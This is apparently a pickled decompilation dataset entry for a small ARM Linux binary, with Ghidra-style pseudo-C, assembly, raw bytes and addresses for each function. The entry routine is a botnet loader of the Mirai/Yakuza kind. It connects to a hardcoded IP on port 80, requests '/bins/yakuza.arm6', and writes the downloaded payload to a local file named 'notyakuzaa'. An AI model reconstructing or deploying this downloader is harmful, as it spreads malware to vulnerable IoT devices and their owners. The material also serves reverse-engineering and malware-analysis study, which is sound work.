(dp0
S'FUN_00008160'
p1
(S'\n__stdcall FUN_00008160()\n'
p2
V\u000avoid FUN_00008160(undefined4 uParm1,undefined4 uParm2,undefined4 uParm3)\u000a\u000a{\u000a  FUN_00008390(4,uParm1,uParm2,uParm3);\u000a  return;\u000a}\u000a\u000a
p3
S'str lr,[sp,#-0x4]!\ncpy r12,r1\ncpy r3,r2\ncpy r1,r0\nsub sp,sp,#0x4\ncpy r2,r12\nmov r0,#0x4\nbl 0x00008390\nadd sp,sp,#0x4\nldr lr,[sp],#0x4\nbx lr\n'
p4
S'04 e0 2d e5\n01 c0 a0 e1\n02 30 a0 e1\n00 10 a0 e1\n04 d0 4d e2\n0c 20 a0 e1\n04 00 a0 e3\n83 00 00 eb\n04 d0 8d e2\n04 e0 9d e4\n1e ff 2f e1\n'
p5
S'.text:00008160\n.text:00008164\n.text:00008168\n.text:0000816c\n.text:00008170\n.text:00008174\n.text:00008178\n.text:0000817c\n.text:00008180\n.text:00008184\n.text:00008188\n'
p6
tp7
sS'FUN_00008390'
p8
(S'\n__stdcall FUN_00008390(undefined param_1, undefined param_2, undefined param_3, undefined param_4, undefined4 param_5)\n'
p9
V\u000aundefined8\u000aFUN_00008390(undefined4 param_1,uint param_2,undefined4 param_3,undefined4 param_4,\u000a            undefined4 param_5)\u000a\u000a{\u000a  undefined8 uVar1;\u000a  \u000a  software_interrupt(0);\u000a  if (param_2 < 0xfffff000) {\u000a    return CONCAT44(param_2,param_3);\u000a  }\u000a  uVar1 = FUN_000083e0(param_2,param_3,param_4,param_5);\u000a  *(int *)((ulonglong)uVar1 >> 0x20) = -param_2;\u000a  return CONCAT44(0xffffffff,(int)uVar1);\u000a}\u000a\u000a
p10
S'cpy r12,sp\nstmdb sp!,{ r4 r5 r6 r7 }\ncpy r7,r0\ncpy r0,r1\ncpy r1,r2\ncpy r2,r3\nldmia r12,{ r3 r4 r5 r6 }\nswi 0x0\nldmia sp!,{ r4 r5 r6 r7 }\ncmn r0,#0x1000\nmovcc pc,lr\nb 0x000083c0\nstmdb sp!,{ r4 lr }\ncpy r4,r0\nbl 0x000083e0\nrsb r4,r4,#0x0\nstr r4,[r0,#0x0]\nmvn r0,#0x0\nldmia sp!,{ r4 lr }\nbx lr\n'
p11
S'0d c0 a0 e1\nf0 00 2d e9\n00 70 a0 e1\n01 00 a0 e1\n02 10 a0 e1\n03 20 a0 e1\n78 00 9c e8\n00 00 00 ef\nf0 00 bd e8\n01 0a 70 e3\n0e f0 a0 31\nff ff ff ea\n10 40 2d e9\n00 40 a0 e1\n04 00 00 eb\n00 40 64 e2\n00 40 80 e5\n00 00 e0 e3\n10 40 bd e8\n1e ff 2f e1\n'
p12
S'.text:00008390\n.text:00008394\n.text:00008398\n.text:0000839c\n.text:000083a0\n.text:000083a4\n.text:000083a8\n.text:000083ac\n.text:000083b0\n.text:000083b4\n.text:000083b8\n.text:000083bc\n.text:000083c0\n.text:000083c4\n.text:000083c8\n.text:000083cc\n.text:000083d0\n.text:000083d4\n.text:000083d8\n.text:000083dc\n'
p13
tp14
sS'FUN_00008130'
p15
(S'\n__stdcall FUN_00008130()\n'
p16
V\u000avoid FUN_00008130(undefined4 uParm1,undefined4 uParm2,undefined4 uParm3)\u000a\u000a{\u000a  FUN_00008390(DAT_0000815c,uParm1,uParm2,uParm3);\u000a  return;\u000a}\u000a\u000a
p17
S'str lr,[sp,#-0x4]!\ncpy r12,r1\ncpy r3,r2\ncpy r1,r0\nsub sp,sp,#0x4\ncpy r2,r12\nldr r0,[0x815c]\nbl 0x00008390\nadd sp,sp,#0x4\nldr lr,[sp],#0x4\nbx lr\n'
p18
S'04 e0 2d e5\n01 c0 a0 e1\n02 30 a0 e1\n00 10 a0 e1\n04 d0 4d e2\n0c 20 a0 e1\n0c 00 9f e5\n8f 00 00 eb\n04 d0 8d e2\n04 e0 9d e4\n1e ff 2f e1\n'
p19
S'.text:00008130\n.text:00008134\n.text:00008138\n.text:0000813c\n.text:00008140\n.text:00008144\n.text:00008148\n.text:0000814c\n.text:00008150\n.text:00008154\n.text:00008158\n'
p20
tp21
sS'FUN_00008104'
p22
(S'\n__stdcall FUN_00008104()\n'
p23
V\u000avoid FUN_00008104(undefined4 uParm1,undefined4 uParm2,undefined4 uParm3)\u000a\u000a{\u000a  FUN_00008390(5,uParm1,uParm2,uParm3);\u000a  return;\u000a}\u000a\u000a
p24
S'str lr,[sp,#-0x4]!\ncpy r12,r1\ncpy r3,r2\ncpy r1,r0\nsub sp,sp,#0x4\ncpy r2,r12\nmov r0,#0x5\nbl 0x00008390\nadd sp,sp,#0x4\nldr lr,[sp],#0x4\nbx lr\n'
p25
S'04 e0 2d e5\n01 c0 a0 e1\n02 30 a0 e1\n00 10 a0 e1\n04 d0 4d e2\n0c 20 a0 e1\n05 00 a0 e3\n9a 00 00 eb\n04 d0 8d e2\n04 e0 9d e4\n1e ff 2f e1\n'
p26
S'.text:00008104\n.text:00008108\n.text:0000810c\n.text:00008110\n.text:00008114\n.text:00008118\n.text:0000811c\n.text:00008120\n.text:00008124\n.text:00008128\n.text:0000812c\n'
p27
tp28
sS'entry'
p29
(S'\n__stdcall entry()\n'
p30
V\u000avoid entry(void)\u000a\u000a{\u000a  byte *pbVar1;\u000a  uint uVar2;\u000a  int iVar3;\u000a  int iVar4;\u000a  int iVar5;\u000a  undefined *puVar6;\u000a  uint uVar7;\u000a  int iVar8;\u000a  undefined auStack172 [128];\u000a  undefined2 uStack44;\u000a  undefined2 uStack42;\u000a  undefined4 uStack40;\u000a  byte bStack25;\u000a  \u000a  iVar8 = 0;\u000a  puVar6 = PTR_DAT_00008368;\u000a  while( true ) {\u000a    pbVar1 = puVar6 + -1;\u000a    uVar7 = (uint)*pbVar1;\u000a    puVar6 = puVar6 + 1;\u000a    if (*pbVar1 == 0) break;\u000a    iVar8 = iVar8 + 1;\u000a  }\u000a  FUN_00008160(1,PTR_s_YAKUZA_0000836c,7);\u000a  uStack44 = 2;\u000a  uStack42 = 0x5000;\u000a  uStack40 = FUN_000080a0(0xb9,0x65,0x69,0xd3);\u000a  iVar3 = FUN_00008104(PTR_s_notyakuzaa_00008378,DAT_00008370,DAT_00008374);\u000a  iVar4 = FUN_000081b8(2,1,uVar7);\u000a  if (iVar4 == -1 || iVar3 == -1) {\u000a    FUN_000080c4(1);\u000a  }\u000a  iVar5 = FUN_00008130(iVar4,&uStack44,0x10);\u000a  if (iVar5 < 0) {\u000a    FUN_00008160(1,PTR_DAT_0000837c,4);\u000a    FUN_000080c4(-iVar5);\u000a  }\u000a  iVar5 = FUN_00008160(iVar4,PTR_s_GET__bins_yakuza_arm6_HTTP_1_0_U_00008380,iVar8 + 0x1d);\u000a  if (iVar5 != iVar8 + 0x1d) {\u000a    FUN_000080c4(3);\u000a  }\u000a  uVar2 = DAT_00008384;\u000a  do {\u000a    iVar8 = FUN_0000818c(iVar4,&bStack25,1);\u000a    if (iVar8 != 1) {\u000a      FUN_000080c4(4);\u000a    }\u000a    uVar7 = (uint)bStack25 | uVar7 << 8;\u000a  } while (uVar7 != uVar2);\u000a  while (iVar8 = FUN_0000818c(iVar4,auStack172,0x80), 0 < iVar8) {\u000a    FUN_00008160(iVar3);\u000a  }\u000a  FUN_000080e4(iVar4,auStack172);\u000a  FUN_000080e4(iVar3);\u000a  FUN_00008160(1,PTR_DAT_00008388,4);\u000a  FUN_000080c4(5);\u000a  return;\u000a}\u000a\u000a
p31
S'b 0x000081e8\n'
p32
S'95 ff ff ea\n'
p33
S'.text:0000838c\n'
p34
tp35
sS'FUN_000080a0'
p36
(S'\n__stdcall FUN_000080a0()\n'
p37
V\u000auint FUN_000080a0(int iParm1,int iParm2,int iParm3,uint uParm4)\u000a\u000a{\u000a  uint uVar1;\u000a  \u000a  uVar1 = uParm4 | iParm2 << 0x10 | iParm1 << 0x18 | iParm3 << 8;\u000a  return uParm4 << 0x18 | iParm3 << 0x10 | (uVar1 & 0xff0000) >> 8 | uVar1 >> 0x18;\u000a}\u000a\u000a
p38
S'orr r3,r3,r1, lsl #0x10\norr r3,r3,r0, lsl #0x18\norr r3,r3,r2, lsl #0x8\nmov r0,r3, lsl #0x18\norr r0,r0,r2, lsl #0x10\nand r2,r3,#0xff0000\norr r0,r0,r2, lsr #0x8\norr r0,r0,r3, lsr #0x18\nbx lr\n'
p39
S'01 38 83 e1\n00 3c 83 e1\n02 34 83 e1\n03 0c a0 e1\n02 08 80 e1\nff 28 03 e2\n22 04 80 e1\n23 0c 80 e1\n1e ff 2f e1\n'
p40
S'.text:000080a0\n.text:000080a4\n.text:000080a8\n.text:000080ac\n.text:000080b0\n.text:000080b4\n.text:000080b8\n.text:000080bc\n.text:000080c0\n'
p41
tp42
sS'FUN_000080e4'
p43
(S'\n__stdcall FUN_000080e4()\n'
p44
V\u000avoid FUN_000080e4(undefined4 uParm1)\u000a\u000a{\u000a  FUN_00008390(6,uParm1);\u000a  return;\u000a}\u000a\u000a
p45
S'str lr,[sp,#-0x4]!\ncpy r1,r0\nsub sp,sp,#0x4\nmov r0,#0x6\nbl 0x00008390\nadd sp,sp,#0x4\nldr lr,[sp],#0x4\nbx lr\n'
p46
S'04 e0 2d e5\n00 10 a0 e1\n04 d0 4d e2\n06 00 a0 e3\na5 00 00 eb\n04 d0 8d e2\n04 e0 9d e4\n1e ff 2f e1\n'
p47
S'.text:000080e4\n.text:000080e8\n.text:000080ec\n.text:000080f0\n.text:000080f4\n.text:000080f8\n.text:000080fc\n.text:00008100\n'
p48
tp49
sS'FUN_000083e0'
p50
(S'\n__stdcall FUN_000083e0()\n'
p51
V\u000aint FUN_000083e0(void)\u000a\u000a{\u000a  return DAT_000083f4 + 0x83f0 + DAT_000083f8;\u000a}\u000a\u000a
p52
S'ldr r3,[0x83f4]\nldr r0,[0x83f8]\nadd r3,pc,r3\nadd r0,r3,r0\nbx lr\n'
p53
S'0c 30 9f e5\n0c 00 9f e5\n03 30 8f e0\n00 00 83 e0\n1e ff 2f e1\n'
p54
S'.text:000083e0\n.text:000083e4\n.text:000083e8\n.text:000083ec\n.text:000083f0\n'
p55
tp56
sS'FUN_0000818c'
p57
(S'\n__stdcall FUN_0000818c()\n'
p58
V\u000avoid FUN_0000818c(undefined4 uParm1,undefined4 uParm2,undefined4 uParm3)\u000a\u000a{\u000a  FUN_00008390(3,uParm1,uParm2,uParm3);\u000a  return;\u000a}\u000a\u000a
p59
S'str lr,[sp,#-0x4]!\ncpy r12,r1\ncpy r3,r2\ncpy r1,r0\nsub sp,sp,#0x4\ncpy r2,r12\nmov r0,#0x3\nbl 0x00008390\nadd sp,sp,#0x4\nldr lr,[sp],#0x4\nbx lr\n'
p60
S'04 e0 2d e5\n01 c0 a0 e1\n02 30 a0 e1\n00 10 a0 e1\n04 d0 4d e2\n0c 20 a0 e1\n03 00 a0 e3\n78 00 00 eb\n04 d0 8d e2\n04 e0 9d e4\n1e ff 2f e1\n'
p61
S'.text:0000818c\n.text:00008190\n.text:00008194\n.text:00008198\n.text:0000819c\n.text:000081a0\n.text:000081a4\n.text:000081a8\n.text:000081ac\n.text:000081b0\n.text:000081b4\n'
p62
tp63
sS'FUN_000080c4'
p64
(S'\n__stdcall FUN_000080c4()\n'
p65
V\u000avoid FUN_000080c4(undefined4 uParm1)\u000a\u000a{\u000a  FUN_00008390(1,uParm1);\u000a  return;\u000a}\u000a\u000a
p66
S'str lr,[sp,#-0x4]!\ncpy r1,r0\nsub sp,sp,#0x4\nmov r0,#0x1\nbl 0x00008390\nadd sp,sp,#0x4\nldr lr,[sp],#0x4\nbx lr\n'
p67
S'04 e0 2d e5\n00 10 a0 e1\n04 d0 4d e2\n01 00 a0 e3\nad 00 00 eb\n04 d0 8d e2\n04 e0 9d e4\n1e ff 2f e1\n'
p68
S'.text:000080c4\n.text:000080c8\n.text:000080cc\n.text:000080d0\n.text:000080d4\n.text:000080d8\n.text:000080dc\n.text:000080e0\n'
p69
tp70
sS'FUN_000081b8'
p71
(S'\n__stdcall FUN_000081b8()\n'
p72
V\u000avoid FUN_000081b8(undefined4 uParm1,undefined4 uParm2,undefined4 uParm3)\u000a\u000a{\u000a  FUN_00008390(DAT_000081e4,uParm1,uParm2,uParm3);\u000a  return;\u000a}\u000a\u000a
p73
S'str lr,[sp,#-0x4]!\ncpy r12,r1\ncpy r3,r2\ncpy r1,r0\nsub sp,sp,#0x4\ncpy r2,r12\nldr r0,[0x81e4]\nbl 0x00008390\nadd sp,sp,#0x4\nldr lr,[sp],#0x4\nbx lr\n'
p74
S'04 e0 2d e5\n01 c0 a0 e1\n02 30 a0 e1\n00 10 a0 e1\n04 d0 4d e2\n0c 20 a0 e1\n0c 00 9f e5\n6d 00 00 eb\n04 d0 8d e2\n04 e0 9d e4\n1e ff 2f e1\n'
p75
S'.text:000081b8\n.text:000081bc\n.text:000081c0\n.text:000081c4\n.text:000081c8\n.text:000081cc\n.text:000081d0\n.text:000081d4\n.text:000081d8\n.text:000081dc\n.text:000081e0\n'
p76
tp77
sS'FUN_000081e8'
p78
(S'\n__stdcall FUN_000081e8()\n'
p79
V\u000avoid FUN_000081e8(void)\u000a\u000a{\u000a  byte *pbVar1;\u000a  uint uVar2;\u000a  int iVar3;\u000a  int iVar4;\u000a  int iVar5;\u000a  undefined *puVar6;\u000a  uint uVar7;\u000a  int iVar8;\u000a  undefined auStack172 [128];\u000a  undefined2 local_2c;\u000a  undefined2 local_2a;\u000a  undefined4 local_28;\u000a  byte local_19;\u000a  \u000a  iVar8 = 0;\u000a  puVar6 = PTR_DAT_00008368;\u000a  while( true ) {\u000a    pbVar1 = puVar6 + -1;\u000a    uVar7 = (uint)*pbVar1;\u000a    puVar6 = puVar6 + 1;\u000a    if (*pbVar1 == 0) break;\u000a    iVar8 = iVar8 + 1;\u000a  }\u000a  FUN_00008160(1,PTR_s_YAKUZA_0000836c,7);\u000a  local_2c = 2;\u000a  local_2a = 0x5000;\u000a  local_28 = FUN_000080a0(0xb9,0x65,0x69,0xd3);\u000a  iVar3 = FUN_00008104(PTR_s_notyakuzaa_00008378,DAT_00008370,DAT_00008374);\u000a  iVar4 = FUN_000081b8(2,1,uVar7);\u000a  if (iVar4 == -1 || iVar3 == -1) {\u000a    FUN_000080c4(1);\u000a  }\u000a  iVar5 = FUN_00008130(iVar4,&local_2c,0x10);\u000a  if (iVar5 < 0) {\u000a    FUN_00008160(1,PTR_DAT_0000837c,4);\u000a    FUN_000080c4(-iVar5);\u000a  }\u000a  iVar5 = FUN_00008160(iVar4,PTR_s_GET__bins_yakuza_arm6_HTTP_1_0_U_00008380,iVar8 + 0x1d);\u000a  if (iVar5 != iVar8 + 0x1d) {\u000a    FUN_000080c4(3);\u000a  }\u000a  uVar2 = DAT_00008384;\u000a  do {\u000a    iVar8 = FUN_0000818c(iVar4,&local_19,1);\u000a    if (iVar8 != 1) {\u000a      FUN_000080c4(4);\u000a    }\u000a    uVar7 = (uint)local_19 | uVar7 << 8;\u000a  } while (uVar7 != uVar2);\u000a  while (iVar8 = FUN_0000818c(iVar4,auStack172,0x80), 0 < iVar8) {\u000a    FUN_00008160(iVar3);\u000a  }\u000a  FUN_000080e4(iVar4,auStack172);\u000a  FUN_000080e4(iVar3);\u000a  FUN_00008160(1,PTR_DAT_00008388,4);\u000a  FUN_000080c4(5);\u000a  return;\u000a}\u000a\u000a
p80
S'stmdb sp!,{ r4 r5 r6 r7 r8 lr }\nldr r3,[0x8368]\nsub sp,sp,#0x98\nmov r8,#0x0\nb 0x00008200\nadd r8,r8,#0x1\nldrb r6,[r3,#-0x1]\ncmp r6,#0x0\nadd r3,r3,#0x1\nbne 0x000081fc\nldr r1,[0x836c]\nmov r2,#0x7\nmov r0,#0x1\nbl 0x00008160\nmov r12,#0x2\nmov r3,#0xd3\nmov r1,#0x65\nmov r2,#0x69\nstrh r12,[sp,#0x84]\nmov r0,#0xb9\nmov r12,#0x5000\nstrh r12,[sp,#0x86]\nbl 0x000080a0\nldr r1,[0x8370]\nstr r0,[sp,#0x88]\nldr r2,[0x8374]\nldr r0,[0x8378]\nbl 0x00008104\nmov r1,#0x1\ncpy r7,r0\ncpy r2,r6\nmov r0,#0x2\nbl 0x000081b8\ncmn r0,#0x1\ncmnne r7,#0x1\ncpy r5,r0\nmoveq r0,#0x1\nbleq 0x000080c4\ncpy r0,r5\nadd r1,sp,#0x84\nmov r2,#0x10\nbl 0x00008130\nsubs r4,r0,#0x0\nbge 0x000082b0\nmov r0,#0x1\nldr r1,[0x837c]\nmov r2,#0x4\nbl 0x00008160\nrsb r0,r4,#0x0\nbl 0x000080c4\nadd r4,r8,#0x1d\ncpy r0,r5\nldr r1,[0x8380]\ncpy r2,r4\nbl 0x00008160\ncmp r0,r4\nmovne r0,#0x3\nblne 0x000080c4\nldr r8,[0x8384]\ncpy r4,r6\nadd r6,sp,#0x97\ncpy r1,r6\nmov r2,#0x1\ncpy r0,r5\nbl 0x0000818c\ncmp r0,#0x1\nmov r0,#0x4\nblne 0x000080c4\nldrb r3,[sp,#0x97]\norr r4,r3,r4, lsl #0x8\ncmp r4,r8\nbne 0x000082dc\nadd r4,sp,#0x4\ncpy r1,r4\nmov r2,#0x80\ncpy r0,r5\nbl 0x0000818c\nsubs r2,r0,#0x0\ncpy r1,r4\ncpy r0,r7\nble 0x00008334\nbl 0x00008160\nb 0x0000830c\ncpy r0,r5\nbl 0x000080e4\ncpy r0,r7\nbl 0x000080e4\nldr r1,[0x8388]\nmov r2,#0x4\nmov r0,#0x1\nbl 0x00008160\nmov r0,#0x5\nbl 0x000080c4\nadd sp,sp,#0x98\nldmia sp!,{ r4 r5 r6 r7 r8 lr }\nbx lr\n'
p81
S'f0 41 2d e9\n74 31 9f e5\n98 d0 4d e2\n00 80 a0 e3\n00 00 00 ea\n01 80 88 e2\n01 60 53 e5\n00 00 56 e3\n01 30 83 e2\nfa ff ff 1a\n54 11 9f e5\n07 20 a0 e3\n01 00 a0 e3\ncf ff ff eb\n02 c0 a0 e3\nd3 30 a0 e3\n65 10 a0 e3\n69 20 a0 e3\nb4 c8 cd e1\nb9 00 a0 e3\n05 ca a0 e3\nb6 c8 cd e1\n96 ff ff eb\n24 11 9f e5\n88 00 8d e5\n20 21 9f e5\n20 01 9f e5\naa ff ff eb\n01 10 a0 e3\n00 70 a0 e1\n06 20 a0 e1\n02 00 a0 e3\nd2 ff ff eb\n01 00 70 e3\n01 00 77 13\n00 50 a0 e1\n01 00 a0 03\n90 ff ff 0b\n05 00 a0 e1\n84 10 8d e2\n10 20 a0 e3\na7 ff ff eb\n00 40 50 e2\n05 00 00 aa\n01 00 a0 e3\nd8 10 9f e5\n04 20 a0 e3\nad ff ff eb\n00 00 64 e2\n84 ff ff eb\n1d 40 88 e2\n05 00 a0 e1\nc0 10 9f e5\n04 20 a0 e1\na6 ff ff eb\n04 00 50 e1\n03 00 a0 13\n7c ff ff 1b\nac 80 9f e5\n06 40 a0 e1\n97 60 8d e2\n06 10 a0 e1\n01 20 a0 e3\n05 00 a0 e1\na7 ff ff eb\n01 00 50 e3\n04 00 a0 e3\n72 ff ff 1b\n97 30 dd e5\n04 44 83 e1\n08 00 54 e1\nf4 ff ff 1a\n04 40 8d e2\n04 10 a0 e1\n80 20 a0 e3\n05 00 a0 e1\n9b ff ff eb\n00 20 50 e2\n04 10 a0 e1\n07 00 a0 e1\n01 00 00 da\n8b ff ff eb\nf5 ff ff ea\n05 00 a0 e1\n69 ff ff eb\n07 00 a0 e1\n67 ff ff eb\n3c 10 9f e5\n04 20 a0 e3\n01 00 a0 e3\n82 ff ff eb\n05 00 a0 e3\n59 ff ff eb\n98 d0 8d e2\nf0 41 bd e8\n1e ff 2f e1\n'
p82
S'.text:000081e8\n.text:000081ec\n.text:000081f0\n.text:000081f4\n.text:000081f8\n.text:000081fc\n.text:00008200\n.text:00008204\n.text:00008208\n.text:0000820c\n.text:00008210\n.text:00008214\n.text:00008218\n.text:0000821c\n.text:00008220\n.text:00008224\n.text:00008228\n.text:0000822c\n.text:00008230\n.text:00008234\n.text:00008238\n.text:0000823c\n.text:00008240\n.text:00008244\n.text:00008248\n.text:0000824c\n.text:00008250\n.text:00008254\n.text:00008258\n.text:0000825c\n.text:00008260\n.text:00008264\n.text:00008268\n.text:0000826c\n.text:00008270\n.text:00008274\n.text:00008278\n.text:0000827c\n.text:00008280\n.text:00008284\n.text:00008288\n.text:0000828c\n.text:00008290\n.text:00008294\n.text:00008298\n.text:0000829c\n.text:000082a0\n.text:000082a4\n.text:000082a8\n.text:000082ac\n.text:000082b0\n.text:000082b4\n.text:000082b8\n.text:000082bc\n.text:000082c0\n.text:000082c4\n.text:000082c8\n.text:000082cc\n.text:000082d0\n.text:000082d4\n.text:000082d8\n.text:000082dc\n.text:000082e0\n.text:000082e4\n.text:000082e8\n.text:000082ec\n.text:000082f0\n.text:000082f4\n.text:000082f8\n.text:000082fc\n.text:00008300\n.text:00008304\n.text:00008308\n.text:0000830c\n.text:00008310\n.text:00008314\n.text:00008318\n.text:0000831c\n.text:00008320\n.text:00008324\n.text:00008328\n.text:0000832c\n.text:00008330\n.text:00008334\n.text:00008338\n.text:0000833c\n.text:00008340\n.text:00008344\n.text:00008348\n.text:0000834c\n.text:00008350\n.text:00008354\n.text:00008358\n.text:0000835c\n.text:00008360\n.text:00008364\n'
p83
tp84
s.